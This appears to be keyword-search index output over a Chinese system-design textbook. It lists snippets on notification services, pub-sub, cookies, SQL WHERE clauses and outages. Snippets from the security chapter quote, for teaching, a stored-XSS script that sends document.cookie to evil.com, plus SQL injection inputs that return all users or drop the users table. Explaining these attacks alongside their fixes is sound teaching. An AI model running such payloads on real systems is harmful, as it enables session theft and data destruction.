  c23_b09.md: ...set 把每个 URL 存为完整字符串。100 亿（10 billion）URL 平均 100 字节，精确 seen-set 约需 1 TB 内存——昂贵，可能超过单机可用 RAM。Bloom filter 用多个哈希函数每个条目只存几位；1%...
  c25_b03.md: ...A 单元格集合中移除该司机 2. 把该司机加入 B 单元格集合 3. 更新司机位置键  用 Redis sorted set，单元格可用精确坐标作为分数存储司机 ID，实现单元格内细粒度距离排序。Redis 原生 `GEOADD` 和 `GEO...
  c25_b03.md: ...现单元格内细粒度距离排序。Redis 原生 `GEOADD` 和 `GEORADIUS` 命令直接在坐标 sorted set 编码上实现地理空间查询——本质上是内置的 geohash 类空间索引。   #### 位置数据新鲜度  位置更新只有最...
  c25_b06.md: ...) VALUES (X, driver_payout, 'CREDIT');         UPDATE trips SET status = 'BILLED' WHERE trip_id = X;       END IF;     COMM...
  c25_b08.md: ...永久记录：它是频繁覆盖的当前值，带 TTL。Redis 原生支持基于 TTL 的过期、用于地理空间索引的 sorted set 以及原子更新操作，是天然选择。持久化权衡（若 Redis 丢数据，最后 5 秒位置更新丢失）可接受，因为位置数据会被下...
  c26_b13.md: ...is——现在我们理解生产版该存储内部会是什么样子。第 22 章的 timeline 缓存依赖 Redis sorted set——现在我们理解使该存储可靠的复制和一致性模型。   ### 本章总结  本章从零开始设计了一个分布式键值存储，综合了第...

=== notification (31 occurrences) ===
  c02_b10.md: ...）：架构改动。**  把通知服务从同步结账路径移除。从：       User → Payment Service → Notification Service → "Order confirmed"   改成异步模式：       User → Payment...
  c02_b10.md: ...↓ (asynchronously)                              Notification Service (consumes event, sends email)...
  c08_b04.md: ...lytics Service (subscriber)         ├── delivers to Contact Notification Service (subscriber)         └── delivers to Onboarding Ser...
  c13_b10.md: ...队有自己的 Slack 频道、路线图和 on-call 轮值——他们产生的系统自然会有 Payment Service、Notification Service 和 User Service。这些团队主要通过定义好的接口（API、工单）沟通，所以他们的软件组件也通...
  c13_b12.md: ...换。  **答案：** 使用绞杀者无花果模式的分步计划：  **第 1 步：定义契约。** 在写任何服务代码前，先定义 Notification Service 将暴露的 API。Posts Service 如何通知它帖子已创建？通过消息队列（推荐）还是直接 HT...
  c13_b12.md: ...）还是直接 HTTP 调用？决策：使用第 8 章的消息队列——帖子创建时发布 `post.created` 事件到队列；Notification Service 消费该事件。  **第 2 步：增加事件发布但不删除旧代码。** 修改帖子创建代码，在直接插入 `no...
  c13_b12.md: ...，也发布 `post.created` 事件到队列。两条路径同时运行。这很安全，对用户无影响。  **第 3 步：构建 Notification Service。** Notification Service 消费 `post.created` 事件并插入自己的...
  c13_b12.md: ...列。两条路径同时运行。这很安全，对用户无影响。  **第 3 步：构建 Notification Service。** Notification Service 消费 `post.created` 事件并插入自己的 `notifications` 表。部署它并验证...
  c13_b12.md: ...notifications` 表现在可能被重复创建（旧代码和新服务都在插入），但过渡期可接受。  **第 4 步：验证 Notification Service 正确。** 并行运行两条路径一段时间（几天或几周）。监控旧路径和新路径创建的通知差异。修复 Notif...
  c13_b12.md: ...ation Service 正确。** 并行运行两条路径一段时间（几天或几周）。监控旧路径和新路径创建的通知差异。修复 Notification Service 中的 bug。  **第 5 步：移除旧直接数据库访问。** 确信 Notification Serv...
  c13_b12.md: ...异。修复 Notification Service 中的 bug。  **第 5 步：移除旧直接数据库访问。** 确信 Notification Service 正确后，从帖子创建代码中删除直接插入 `notifications` 表的逻辑。帖子创建代码现在只向队...
  c13_b12.md: ...ce 正确后，从帖子创建代码中删除直接插入 `notifications` 表的逻辑。帖子创建代码现在只向队列发布事件。Notification Service 现在是 notifications 表的唯一写入者。  **第 6 步：迁移通知数据存储。** 由于单...
  c13_b12.md: ...s 表的唯一写入者。  **第 6 步：迁移通知数据存储。** 由于单体的 `notifications` 表现在只由 Notification Service 读写，把它迁移到 Notification Service 自己的数据库实例。更新 Notificat...
  c13_b12.md: ...* 由于单体的 `notifications` 表现在只由 Notification Service 读写，把它迁移到 Notification Service 自己的数据库实例。更新 Notification Service 的连接配置。Posts Servic...
  c13_b12.md: ...ification Service 读写，把它迁移到 Notification Service 自己的数据库实例。更新 Notification Service 的连接配置。Posts Service 不再引用 `notifications` 表。  迁移全程没有...
  c15_b01.md: ...t Service 使用不参与 2PC 的第三方支付处理器。User Service 是 PostgreSQL 数据库。Notification Service 使用邮件 API。这些系统无法共享分布式事务。  如果第 1 步成功但第 2 步失败会怎样？用户已被扣...
  c15_b05.md: ...`is_premium = true` | 设置 user 42 的 `is_premium = false` 3 | Notification Service | 发送确认邮件 | （无法补偿——邮件不能撤回。记录问题。）  Saga 执行：第 1 步成功，第...
  c15_b06.md: ...rge.succeeded`，把用户更新为高级版，并发布 `user.upgraded.to.premium`。 4. Notification Service 监听 `user.upgraded.to.premium`，发送邮件。  补偿：如果 User Ser...
  c15_b06.md: ...若成功：调用 User Service：设置 `is_premium = true`。等待结果。 3. 若成功：调用 Notification Service：发送邮件。等待结果。 4. 若任一步失败：按相反顺序调用补偿。...
  c15_b07.md: ...协调都经过它）。它引入了对其他服务的了解——编排器“知道”Payment Service、User Service 和 Notification Service 的细节，造成耦合。   #### 选哪个？  选择取决于 saga 多复杂，以及你需要多大可见度。...
  c15_b09.md: ...到 `user.upgraded.to.premium`。更新 saga 记录为 `USER_UPGRADED`。调用 Notification Service：“给用户 42 发送高级版确认邮件。”  **第 8 步：** Notification Servic...
  c15_b09.md: ...ED`。调用 Notification Service：“给用户 42 发送高级版确认邮件。”  **第 8 步：** Notification Service 发送邮件（不可补偿——但它是最后一步，所以只有前面步骤成功才会到达这里）。  **第 9 步：** 编...
  c15_b09.md: ...ice 发送邮件（不可补偿——但它是最后一步，所以只有前面步骤成功才会到达这里）。  **第 9 步：** 编排器收到 Notification Service 确认。更新 saga 记录为 `COMPLETE`。用户浏览器轮询升级状态，收到 `COMPLETE`...
  c15_b12.md: ...ollow.follower.count.updated` 事件，带上 `request_id`。  **第 3 步——Notification Service：** 监听 `follow.follower.count.updated`。获取用户 77 的通知偏好...
  c15_b12.md: ...d`。获取用户 77 的通知偏好（用户 77 是否希望收到新关注者邮件通知？）。若合适则发送通知。发布 `follow.notification.sent` 事件。  **补偿流：**  如果第 1 步失败（Social Graph Service 宕机）：`fo...
  c15_b13.md: ...等待。 3. User Service 成功：设置 `current_step = EMAIL_PENDING`。调用 Notification Service。等待。 4. 邮件已发：设置 `current_step = COMPLETE`。返回成功给轮询客户端...
  c15_b13.md: ...PLETE 之前的最后一步）。它重试邮件步骤（使用 Notification Service 的幂等键）。邮件已发送——Notification Service 的幂等检查返回“已发送”而不发送重复邮件。编排器设置 `current_step = COMPLETE...
  c27_b04.md: ...）  **它是什么：** 单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断器。实现优雅降级（若通知服务宕机，帖子仍可成功发布）。  **关键决策：**  * 服务分解遵...
  c27_b06.md: ...）被“绞杀”——不是突然被砍死，而是逐渐被取代。  SocialSnap 把单体分解为微服务时使用了该模式。他们从提取 Notification Service 开始——风险低、边界清晰的功能。单体继续处理所有其他请求。Notification Service 稳...
  c27_b06.md: ...该模式。他们从提取 Notification Service 开始——风险低、边界清晰的功能。单体继续处理所有其他请求。Notification Service 稳定后，提取 User Service，然后是 Post Service。每次提取都是一个离散、低风险...
  c28_b02.md: ...有意识地这样做：在把单体分解为微服务之前，CTO 围绕预期的服务边界重组团队。Feed Team、User Team、Notification Team 和 Post Team 成立。然后，每个团队的第一个项目就是从单体中提取自己的服务。最终的服务与团队边界干净...

=== pub (31 occurrences) ===
  c06_b03.md: ...流（“用户 X 这分钟已调用 47 次 API”）。  **实时数据：** 排行榜（Redis sorted set）、pub-sub 消息、实时在线状态（“谁现在在线”）。   #### 键值存储的 Tradeoffs（权衡）  **收益：**...
  c08_b03.md: ...极难保证）。重复安全处理是消费者逻辑的属性（完全在你的控制之内）。后者几乎总是正确思考问题的方式。   ### 8.4 Pub-Sub——向多个消费者广播事件  生产者-消费者模型是一个生产者向一个消费者发送消息。但如果一个事件有多个相关方呢？...
  c08_b03.md: ...给一个消费者——你需要为每种消费者类型单独一个队列，注册代码要知道所有四个系统），要么需要更聪明的机制。  这就是 **pub-sub**（publish-subscribe，发布-订阅）。...
  c08_b03.md: ...极难保证）。重复安全处理是消费者逻辑的属性（完全在你的控制之内）。后者几乎总是正确思考问题的方式。   ### 8.4 Pub-Sub——向多个消费者广播事件  生产者-消费者模型是一个生产者向一个消费者发送消息。但如果一个事件有多个相关方呢？...
  c08_b03.md: ...给一个消费者——你需要为每种消费者类型单独一个队列，注册代码要知道所有四个系统），要么需要更聪明的机制。  这就是 **pub-sub**（publish-subscribe，发布-订阅）。...
  c08_b04.md: ...#### 定义：Pub-Sub（发布-订阅）  在 **pub-sub 模式** 中，生产者（**发布者，publishers**）把事件发布...
  c08_b04.md: ...#### 定义：Pub-Sub（发布-订阅）  在 **pub-sub 模式** 中，生产者（**发布者，publishers**）把事件发布到命名的**主题（topics）**（或...
  c08_b04.md: ...bscribers**）订阅特定主题并接收发布到该主题的每条消息。一条发布的消息投递给所有订阅者。  plain 语言：pub-sub 像报纸。报纸（发布者）印一版。每个订阅者都得到该版副本。订阅者互不知晓；他们只知道报纸。  SocialSna...
  c08_b04.md: ...Kafka——分布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对待，因为它的设计哲学与传统队列根本不同——也因为它塑造了...
  c08_b04.md: ...#### 定义：Pub-Sub（发布-订阅）  在 **pub-sub 模式** 中，生产者（**发布者，publishers**）把事件发布...
  c08_b04.md: ...#### 定义：Pub-Sub（发布-订阅）  在 **pub-sub 模式** 中，生产者（**发布者，publishers**）把事件发布到命名的**主题（topics）**（或...
  c08_b04.md: ...bscribers**）订阅特定主题并接收发布到该主题的每条消息。一条发布的消息投递给所有订阅者。  plain 语言：pub-sub 像报纸。报纸（发布者）印一版。每个订阅者都得到该版副本。订阅者互不知晓；他们只知道报纸。  SocialSna...
  c08_b04.md: ...Kafka——分布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对待，因为它的设计哲学与传统队列根本不同——也因为它塑造了...
  c08_b05.md: ...暂无法重放。  对更简单的用例（单个消费者从队列读取），托管服务如 Amazon SQS 或 Google Cloud Pub/Sub 通常是正确选择。Kafka 在你需要高吞吐、多个独立消费者组或事件重放能力时才配得上它的复杂度。   ###...
  c08_b10.md: ...少一次投递实现。  结果：理想状态，但实践中通过仔细的幂等设计而非真正正好一次基础设施实现。  **Q3.** 什么是 pub-sub 模式？它与简单生产者-消费者队列有何不同？何时会选择 pub-sub 而非点对点队列？...
  c08_b10.md: ...正好一次基础设施实现。  **Q3.** 什么是 pub-sub 模式？它与简单生产者-消费者队列有何不同？何时会选择 pub-sub 而非点对点队列？...
  c08_b11.md: ...中的消息——这对并行化工作有用（多个 worker 处理同一队列的订单）。但每条消息只到一个 worker。  在 **pub-sub** 中，发布到主题的消息投递给所有订阅者。每个订阅者得到自己的副本。订阅者相互独立——新增订阅者不影响现有订阅...
  c08_b11.md: ...阅者。每个订阅者得到自己的副本。订阅者相互独立——新增订阅者不影响现有订阅者，发布者也不需要知道谁在订阅。  **选择 pub-sub 当：** 一个事件有多个独立消费者感兴趣。SocialSnap 的注册事件对邮件服务、分析、联系人通知和 on...
  c08_b11.md: ...知和 onboarding 都感兴趣。如果你用点对点队列，需要四个单独队列（每个消费者一个），注册服务要向四个队列发布。Pub-sub 把它合并：一个主题、四个订阅者、一次发布。  **选择点对点当：** 你想让多个 worker 处理同一队列以...
  c08_b11.md: ...列以并行化工作。十个邮件服务 worker 都读同一队列意味着十封邮件并行处理——每封邮件只由一个 worker 处理。Pub-sub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层...
  c08_b11.md: ...ub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层用 pub-sub（一个事件 → 多个消费者），在每个消费者类型内部用点对点（该类型的多个 worker 共享一个队列）。  **...
  c08_b11.md: ...中的消息——这对并行化工作有用（多个 worker 处理同一队列的订单）。但每条消息只到一个 worker。  在 **pub-sub** 中，发布到主题的消息投递给所有订阅者。每个订阅者得到自己的副本。订阅者相互独立——新增订阅者不影响现有订阅...
  c08_b11.md: ...阅者。每个订阅者得到自己的副本。订阅者相互独立——新增订阅者不影响现有订阅者，发布者也不需要知道谁在订阅。  **选择 pub-sub 当：** 一个事件有多个独立消费者感兴趣。SocialSnap 的注册事件对邮件服务、分析、联系人通知和 on...
  c08_b11.md: ...知和 onboarding 都感兴趣。如果你用点对点队列，需要四个单独队列（每个消费者一个），注册服务要向四个队列发布。Pub-sub 把它合并：一个主题、四个订阅者、一次发布。  **选择点对点当：** 你想让多个 worker 处理同一队列以...
  c08_b11.md: ...列以并行化工作。十个邮件服务 worker 都读同一队列意味着十封邮件并行处理——每封邮件只由一个 worker 处理。Pub-sub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层...
  c08_b11.md: ...ub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层用 pub-sub（一个事件 → 多个消费者），在每个消费者类型内部用点对点（该类型的多个 worker 共享一个队列）。  **...
  c08_b16.md: ...或超过托管队列的吞吐时，Kafka 才配得上它的复杂度。当你只需要简单的“后台执行这个任务”时，SQS 或 Cloud Pub/Sub 等托管队列是正确选择。...
  c08_b17.md: ...至少一次、正好一次——描述故障时消息会发生什么。至少一次是最常见的生产选择，与幂等消费者配对以安全处理重复投递。  **Pub-sub** 扩展该模式，向多个独立消费者广播事件。单个事件可在多个系统触发动作，发布者无需知道每个消费者。  **Ka...
  c11_b09.md: ...→ 对象存储。缓存 → Redis。后台作业状态 → 数据库或队列系统。WebSocket 连接状态 → Redis pub/sub 或 WebSocket 网关服务。  遵循无状态要求的应用服务器是纯计算节点：接收请求，从共享基础设施读取状态...
  c21_b09.md: ...器  这就是 **扇出问题（fan-out problem）**——单次写入必须分发给大量读者。它最早出现在第 8 章 pub-sub 讨论中，现在显现为核心架构挑战。  对 DM 场景（2 名参与者），扇出微不足道。对小群（最多 100 名成员...
  c28_b11.md: ...* (Ch 8) | 生产者延迟更高（异步投递） | 至少一次或精确一次（可配置） | 高——队列缓冲故障 | 中 **Pub-sub messaging** (Ch 8) | 更高（异步） | 最终（消费者按自己节奏处理） | 极高——故障域解...

=== cookie (31 occurrences) ===
  c09_b03.md: ...PS、SMTP 等应用协议所在层。在第 7 层，负载均衡器能看到 HTTP 请求的实际内容：URL 路径、HTTP 头、cookie 和请求体。   #### 第 4 层负载均衡  第 4 层（L4）负载均衡器基于网络层信息（IP 地址和 TCP 端口...
  c09_b12.md: ...基于网络层信息。  **第 7 层（L7）负载均衡器** 工作在应用层。它读取完整 HTTP 请求——URL 路径、头、cookie，以及可选的请求体。路由决策可以基于任何 HTTP 层属性。  **只能用 L7 实现的路由规则：**  “把所有 UR...
  c09_b17.md: ...化、动态——不能在页面级缓存到 CDN。  **Q2.**（联系第 8 章消息队列）一个带粘性会话的负载均衡器基于会话 cookie 哈希把每个用户路由到同一台服务器。一个工程师说粘性会话不用共享会话存储就解决了会话管理问题。另一个工程师说粘性会话是反...
  c11_b01.md: ...ssion）**：一条“用户 42 当前已认证”的记录。服务器需要把该用户后续请求与认证会话关联起来。  传统方案：**cookie**。登录后，服务器用 `Set-Cookie` 头响应，其中包含一个**会话 ID**——类似 `sess_a7b3c...
  c11_b01.md: ...”的记录。服务器需要把该用户后续请求与认证会话关联起来。  传统方案：**cookie**。登录后，服务器用 `Set-Cookie` 头响应，其中包含一个**会话 ID**——类似 `sess_a7b3c9d2e4f1...` 的随机字符串。浏览器存...
  c11_b01.md: ...应，其中包含一个**会话 ID**——类似 `sess_a7b3c9d2e4f1...` 的随机字符串。浏览器存储这个 cookie，并在之后对同一域名的每个请求中附带发送。服务器在**会话存储（session store）**（存放会话数据的位置）中...
  c11_b01.md: ...sername": "bob", "created_at": ...},         ...     }   当带 cookie `sess_a7b3c9d2e4f1` 的请求到达时，服务器在本地 `sessions` 字典中查找，找到用户 42，...
  c11_b02.md: ...均衡器把她的登录请求路由到 Server A。Server A 在本地 `sessions` 字典中创建会话记录并设置 cookie。Alice 的浏览器现在有了会话 cookie。  Alice 点击“我的资料”。负载均衡器把该请求路由到 Serve...
  c11_b02.md: ...erver A 在本地 `sessions` 字典中创建会话记录并设置 cookie。Alice 的浏览器现在有了会话 cookie。  Alice 点击“我的资料”。负载均衡器把该请求路由到 Server B（轮询序列中的下一个）。Server B...
  c11_b02.md: ...lice 点击“我的资料”。负载均衡器把该请求路由到 Server B（轮询序列中的下一个）。Server B 收到带 cookie `sess_a7b3c9d2e4f1` 的请求。Server B 在**它自己的** `sessions` 字典中查找...
  c11_b06.md: ...。24 小时内服务器没有任何办法让 JWT 失效，因为服务器没有已签发 token 的中心记录。“登出”只是删除客户端 cookie，但如果攻击者窃取了 Alice 的 JWT，他们会一直用到过期。  存在 workaround：  * 短 JWT 过...
  c11_b11.md: ...rver B 或 C，它们检查自己的本地会话字典——其中没有 Alice 的会话。Server B 没找到 Alice cookie 对应的会话，把她当作未认证。  **修复：** 把会话存储从应用服务器本地内存移到共享外部 Redis 实例。三台应用...
  c19_b06.md: ...="post">{{ post.content }}</div>   如果用户发布 `<script>document.cookie = document.cookie + document.domain; fetch('https://evil.co...
  c19_b06.md: ...ntent }}</div>   如果用户发布 `<script>document.cookie = document.cookie + document.domain; fetch('https://evil.com/steal?c=' + docu...
  c19_b06.md: ...cument.domain; fetch('https://evil.com/steal?c=' + document.cookie)</script>`，这段脚本会在加载该帖子的每个浏览器中执行。脚本窃取查看用户的会话 cookie 并发送到攻击者服...
  c19_b06.md: ...document.cookie)</script>`，这段脚本会在加载该帖子的每个浏览器中执行。脚本窃取查看用户的会话 cookie 并发送到攻击者服务器。然后攻击者可冒充该用户。  这是**存储型 XSS**（恶意脚本存储在数据库中，任何用户查看时执...
  c19_b07.md: ...#### 跨站请求伪造（CSRF）  SocialSnap 用户登录后，浏览器存储会话 cookie。每个 SocialSnap 请求都自动包含该 cookie——浏览器对所有发往该域的请求都会发送它，无论请求来源何处。...
  c19_b07.md: ...RF）  SocialSnap 用户登录后，浏览器存储会话 cookie。每个 SocialSnap 请求都自动包含该 cookie——浏览器对所有发往该域的请求都会发送它，无论请求来源何处。  CSRF 攻击利用这一点。攻击者在 `evil.com`...
  c19_b07.md: ...，浏览器加载这个“图片”——实际上是向 SocialSnap 发 GET 请求。SocialSnap 看到带有有效会话 cookie 的请求（浏览器自动发送）并删除帖子 12345。  修复方法：**CSRF token**。SocialSnap 渲染...
  c19_b07.md: ...SocialSnap 表单中的 CSRF token（被同源策略阻止），它无法伪造有效请求。  **SameSite cookie 属性** 是现代防御：在会话 cookie 上设置 `SameSite=Strict` 或 `SameSite=Lax...
  c19_b07.md: ...token（被同源策略阻止），它无法伪造有效请求。  **SameSite cookie 属性** 是现代防御：在会话 cookie 上设置 `SameSite=Strict` 或 `SameSite=Lax`，告诉浏览器不在跨源请求上发送 cooki...
  c19_b07.md: ...ookie 上设置 `SameSite=Strict` 或 `SameSite=Lax`，告诉浏览器不在跨源请求上发送 cookie。这基本消除了现代浏览器的 CSRF 风险。   #### 常见误解  常见误解是这些漏洞是“已解决的问题”——现代框架...
  c19_b12.md: ...Q1.** 用户加载 SocialSnap 帖子，浏览器将部分帖子内容渲染为 HTML，导致脚本执行。该脚本把用户会话 cookie 发到外部服务器。这是什么类型的攻击，根因是什么？  **答案：** 这是**存储型跨站脚本（stored XSS）**...
  c19_b12.md: ...、提升他们在其他系统的权限。最小权限限制爆炸半径。  **Q4.** 什么是 CSRF 攻击，为什么 SameSite cookie 属性能提供保护？...
  c19_b13.md: ...CSRF 攻击诱使用户的浏览器在用户已认证的站点上发起请求，而用户并不知情。浏览器会自动在所有发往该域的请求上包含会话 cookie，因此伪造请求看起来已认证。攻击者无法读取响应（被同源策略阻止），但如果请求有副作用（删除帖子、更改密码），损害已经发生...
  c19_b13.md: ...证。攻击者无法读取响应（被同源策略阻止），但如果请求有副作用（删除帖子、更改密码），损害已经发生。  SameSite cookie 属性指示浏览器不在跨源请求上发送 cookie。`SameSite=Strict` 时，会话 cookie 只在请求来...
  c19_b13.md: ...请求有副作用（删除帖子、更改密码），损害已经发生。  SameSite cookie 属性指示浏览器不在跨源请求上发送 cookie。`SameSite=Strict` 时，会话 cookie 只在请求来自同站时发送——`evil.com` 上的表单无...
  c19_b13.md: ...eSite cookie 属性指示浏览器不在跨源请求上发送 cookie。`SameSite=Strict` 时，会话 cookie 只在请求来自同站时发送——`evil.com` 上的表单无法触发带会话 cookie 的 `socialsnap.co...
  c19_b13.md: ...ite=Strict` 时，会话 cookie 只在请求来自同站时发送——`evil.com` 上的表单无法触发带会话 cookie 的 `socialsnap.com` 请求，因为浏览器会扣留它。`SameSite=Lax` 时，cookie 在顶层...
  c19_b13.md: ...带会话 cookie 的 `socialsnap.com` 请求，因为浏览器会扣留它。`SameSite=Lax` 时，cookie 在顶层导航（点击链接）时发送，但不在子资源请求（图片、脚本、表单）上发送——在安全和可用性之间取得合理平衡。...
  c28_b06.md: ...代码在全球数百个边缘位置的隔离容器中运行。  **边缘计算用例：**  * **A/B 测试和功能开关：** 基于用户 cookie 决定展示哪个 UI 版本——在边缘完成，无需回源往返。 * **请求认证：** 在把请求转发到源站前在边缘验证 JWT...

=== where (30 occurrences) ===
  c05_b02.md: ...FROM posts     JOIN users ON posts.user_id = users.id     WHERE users.username = 'alice'     ORDER BY posts.created_at DESC...
  c05_b02.md: ...有些查询灾难性慢。   #### 朴素方法：全表扫描  假设你运行：      SELECT * FROM posts WHERE user_id = 1;  没有任何特殊结构时，数据库读取 `posts` 表的每一行，检查 `user_id = 1...
  c05_b03.md: ...er_id);  数据库会创建一个 B-tree，每个叶节点包含一个 `user_id` 值和指向对应行的指针。查询 `WHERE user_id = 1` 现在只需要 O(log n) 时间，而不是 O(n)。  **索引的代价：** B-tree...
  c05_b03.md: ...存储换取更快读取。   #### 选择索引什么  索引什么列是关系型数据库设计中影响最大的性能决策之一：  * **为 WHERE 子句中频繁出现的列建索引** * **为外键列建索引**（如 `user_id`），让 join 更快 * **为 O...
  c05_b06.md: ...lized counters）**——这个计数本来可以通过 `SELECT COUNT(*) FROM follows WHERE followed_id = user_id` 推导，但规模上去后这个查询会变贵。我们直接存储计数，并在每次关注/取消关...
  c05_b06.md: ....followed_id     JOIN users ON posts.user_id = users.id     WHERE follows.follower_id = 1  -- Alice 的 user_id     ORDER BY po...
  c05_b09.md: ...1. **这列是否频繁出现在生产查询的 WHERE、JOIN 或 ORDER BY 子句中？** 如果不是，索引代价（写入变慢）可能不值得。 2. **表是否足够大，以至...
  c05_b10.md: ...d     JOIN users AS author ON posts.user_id = author.id     WHERE mentions.user_id = (SELECT id FROM users WHERE username = '...
  c05_b10.md: ...uthor.id     WHERE mentions.user_id = (SELECT id FROM users WHERE username = 'alice')     ORDER BY posts.created_at DESC...
  c05_b10.md: ...eoff（权衡）。  **答案：**  **诊断：** 查询是 `SELECT COUNT(*) FROM likes WHERE post_id = 12345`。在 1.1 billion（11 亿）行下，如果 `post_id` 没有索引（或索...
  c05_b11.md: ...6, 12345);     UPDATE posts SET like_count = like_count + 1 WHERE id = 12345;     COMMIT;  现在“帖子 12345 有多少赞？”变成：      SELECT...
  c05_b11.md: ...T;  现在“帖子 12345 有多少赞？”变成：      SELECT like_count FROM posts WHERE id = 12345;  这是 O(1) 主键查找——微秒级而非毫秒级。tradeoff（权衡）：你现在把计数存在两个...
  c05_b12.md: ...LECT id, content, image_urls, created_at     FROM posts     WHERE user_id = 42     ORDER BY created_at DESC     LIMIT 20;  **...
  c05_b13.md: ...);     UPDATE users SET follower_count = follower_count + 1 WHERE id = 2;     UPDATE users SET following_count = following_co...
  c05_b13.md: ...UPDATE users SET following_count = following_count + 1 WHERE id = 1;     COMMIT;  如果事务中任何操作失败——包括 INSERT 和 UPDATE 之间崩溃——...
  c06_b05.md: ...end_id));   “Alice 的朋友”是：`SELECT friend_id FROM friendships WHERE user_id = alice_id`  “Alice 的朋友的朋友”需要自 join：       SELECT D...
  c06_b05.md: ...f1     JOIN friendships f2 ON f1.friend_id = f2.user_id     WHERE f1.user_id = alice_id       AND f2.friend_id != alice_id;...
  c06_b11.md: ...：       SELECT tag, COUNT(*) as count     FROM hashtags     WHERE created_at > NOW() - INTERVAL '24 hours'     GROUP BY tag...
  c12_b07.md: ...UES (42, 9.99, ...);     UPDATE users SET is_premium = TRUE WHERE user_id = 42;     COMMIT;   如果任一操作失败，事务回滚——支付记录消失，用户仍是非高级。数...
  c12_b11.md: ...*答案：** 伪代码：       1. UPDATE users SET username = 'new_name' WHERE user_id = 42;  // 在用户所在 shard     2. 对每个 shard (0..7):...
  c12_b11.md: ....7):          UPDATE posts SET author_username = 'new_name' WHERE user_id = 42;     3. 使 Redis 中用户 42 的缓存条目失效（见第 7 章）。   失败场景...
  c17_b06.md: ...s (148ms)             [55ms - 80ms]  Database: SELECT posts WHERE id IN (...) (25ms)             [85ms - 195ms] User Service:...
  c17_b06.md: ...(110ms)               [88ms - 190ms] Database: SELECT users WHERE id IN (...) (102ms)           [202ms - 235ms] Redis: set ca...
  c19_b06.md: ...= request.get("username")     query = f"SELECT * FROM users WHERE username = '{user_input}'"     db.execute(query)   如果用户提交用户...
  c19_b06.md: ...xecute(query)   如果用户提交用户名 `alice`，查询变成 `SELECT * FROM users WHERE username = 'alice'`——无害。  但如果用户提交 `' OR '1'='1`，查询变成：...
  c19_b06.md: ...—无害。  但如果用户提交 `' OR '1'='1`，查询变成：       SELECT * FROM users WHERE username = '' OR '1'='1'   条件 `'1'='1'` 永远为真，因此该查询返回数据库中所有用...
  c19_b06.md: ...：`'; DROP TABLE users; --` 使查询变成：       SELECT * FROM users WHERE username = ''; DROP TABLE users; --'   这删除了整个 users 表。所有用户数...
  c19_b06.md: ...也称 prepared statements）：       query = "SELECT * FROM users WHERE username = ?"     db.execute(query, [user_input])   在参数化查询中...
  c25_b06.md: ...BEGIN;       -- 锁定行程记录，防止并发计费       SELECT * FROM trips WHERE trip_id = X FOR UPDATE;            -- 验证该行程尚未计费       IF tr...
  c25_b06.md: ...yout, 'CREDIT');         UPDATE trips SET status = 'BILLED' WHERE trip_id = X;       END IF;     COMMIT;  `FOR UPDATE` 锁防止两个并...

=== outage (30 occurrences) ===
  c07_b01.md: ...s 变成 4 秒。用户看到白屏。这本该是 SocialSnap  breakthrough 的病毒时刻，变成了最尴尬的 outage。  侦探问题是：这 8,000 个请求每个到底在问什么？  几乎可以肯定，它们都在问同样的几样东西。同一篇病毒帖子。同...
  c16_b04.md: ...uorum 写、冲突解决、CRDT。   ### 16.4 熔断器模式  现在我们回到 SocialSnap 的周二的 outage。根因是级联：部分 Redis 失败阻塞应用线程，耗尽线程池，导致整个应用失败。  级联发生是因为应用服务器在 Redi...
  c16_b05.md: ...请求成功（Redis 已恢复）。熔断器闭合。正常运行恢复。  总影响：部分用户约 1 分 5 秒的体验降级，而不是完全 outage。应用服务器全程保持可用。  熔断器与第 8 章的消息队列配合工作。熔断器打开期间，通常会触发写（分析事件、通知派发、审...
  c16_b05.md: ...章的消息队列配合工作。熔断器打开期间，通常会触发写（分析事件、通知派发、审计日志）的操作可以入队而不是被丢弃。队列在 outage 窗口吸收工作，熔断器闭合后排空——因此即使依赖失败，数据也不会永久丢失。...
  c16_b07.md: ...析日志、邮件通知、活动摘要。这些根本不应在关键路径上——它们已经是异步的（第 8、15 章）。  SocialSnap outage 中 Redis 会话存储失败时，一种可能的优雅降级响应：  * 对只读操作临时禁用会话验证（未登录浏览公开帖子无需认证...
  c16_b08.md: ...间短暂打开，提供缓存响应。  用户可见总影响：写操作约 45 秒错误率升高，读操作零错误（由缓存和副本提供）。没有完整 outage。On-call 工程师被告警唤醒，查看事件，然后回去睡觉。到早上，主库磁盘已更换，旧主库作为副本恢复，系统回到完整冗余...
  c16_b09.md: ...就是证据。正确读取它们是把快速修复事故的工程师与手忙脚乱的工程师区分开的侦探技能。  SocialSnap Redis outage 中，关键线索一直存在于监控数据中：  **线索 1——Redis 错误率攀升。** Redis 客户端库记录连接错误和...
  c16_b11.md: ...线程/连接池管理开销 | 混合关键性功能共享同一应用服务器基础设施的系统 优雅降级 | 故障期间系统仍部分可用；比完全 outage 体验更好 | 需要显式设计回退行为；测试所有降级路径复杂 | 部分功能比完全不可用更好的面向用户系统   ### 16...
  c16_b13.md: ...有紧致熔断器、回退策略（缓存 feed、数据库会话回退）已就绪。热门侧边栏失败可接受；不能登录或看 feed 则是完全 outage。...
  c16_b14.md: ...，但用户体验提升显著：原本看到总错误的用户现在看到功能略减的页面。  **Q2.** 在 SocialSnap 周二的 outage 期间，工程师提出两个修复方案：(a) 把线程池大小从 200 增加到 2000，以处理更多并发慢 Redis 调用；(...
  c16_b14.md: ...并发慢 Redis 调用；(b) 把 Redis 连接超时从 30 秒降到 500 毫秒。对每个方案，分析它是否能防止 outage，以及会引入哪些新问题。  提示  想想每个方案在大规模服务器（server）上的表现。它解决根因还是只是延迟问题？...
  c16_b15.md: ...分析：这显著降低 outage 严重程度。用 500 毫秒超时，每个卡住的 Redis 请求最多占用线程 500 毫秒而不是 30 秒。线程池从每次失...
  c16_b19.md: ...一次生产故障，因为这些模式都已就位：熔断器打开以防止级联，舱壁保护关键路径，自动故障转移在 30 秒内把副本提升为主库。Outage 持续 45 秒而非数小时。  线索 C 的侦探技能——事故期间把日志和指标当作线索阅读——预告了第 17 章的可观测性...
